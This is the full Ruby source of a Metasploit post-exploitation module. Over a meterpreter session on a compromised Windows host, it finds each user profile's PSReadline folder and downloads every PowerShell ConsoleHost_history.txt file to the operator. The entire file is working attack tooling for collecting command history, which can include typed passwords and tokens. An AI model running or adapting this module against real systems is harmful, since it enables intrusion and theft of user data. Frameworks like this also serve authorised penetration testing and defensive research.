##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/user_profiles'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  STORE_FILE_TYPE = 'text/plain'

  def initialize(info={})
    super(update_info(info,
        'Name' => 'Windows Gather PSReadline history',
        'Description' => %q{
          Gathers Power Shell history data from the target machine.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Garvit Dewan <d.garvit[at]gmail.com>' # @dgarvit
        ],
        'Platform' => %w{ win },
        'SessionTypes' => [ 'meterpreter' ]
      ))
  end

  def run
    grab_user_profiles.each do |userprofile|
      gather_psreadline_history(userprofile)
    end
  end

  #
  # Check to see if the directory exists on the remote system.
  #
  def dir_exists(profile)
    if profile['AppData'].nil?
      print_error("PowerShell directory not found for #{profile['UserName']}")
      return false
    end

    path = "#{profile['AppData']}\\Microsoft\\Windows"
    dir = "PowerShell"
    dirs = session.fs.dir.foreach(path).collect
    if dirs.include? dir
      path = "#{path}\\#{dir}"
      dir = "PSReadline"
      dirs = session.fs.dir.foreach(path).collect
      if dirs.include? dir
        return true
      else
        print_error("PSReadline directory not found for #{profile['UserName']}")
        return false
      end
    else
      print_error("PowerShell directory not found for #{profile['UserName']}")
      return false
    end
  end

  #
  # Download the PSReadline history file if it exists.
  #
  def gather_psreadline_history(profile)
    name = 'PSReadline'
    path = 'AppData'
    if !dir_exists(profile)
      return false
    end
    print_good("#{name} directory found #{profile['UserName']}")

    fname = "ConsoleHost_history.txt"
    file_path = "#{profile[path]}\\Microsoft\\Windows\\PowerShell\\PSReadline"
    files = session.fs.file.search(file_path, "#{fname}", true)

    if files.size == 0
      print_error("History file not found for #{profile['UserName']}")
      return false
    end

    files.each do |file|
      local_loc = "#{profile['UserName']}_#{name}_#{fname}"
      file_loc = store_local("file", STORE_FILE_TYPE, session, local_loc)
      main_file_loc = "#{file['path']}#{session.fs.file.separator}#{file['name']}"
      print_status("Downloading #{main_file_loc}")
      session.fs.file.download_file(file_loc, main_file_loc)
      print_good("#{name} history file saved to #{file_loc}")
    end
    return true
  end
end
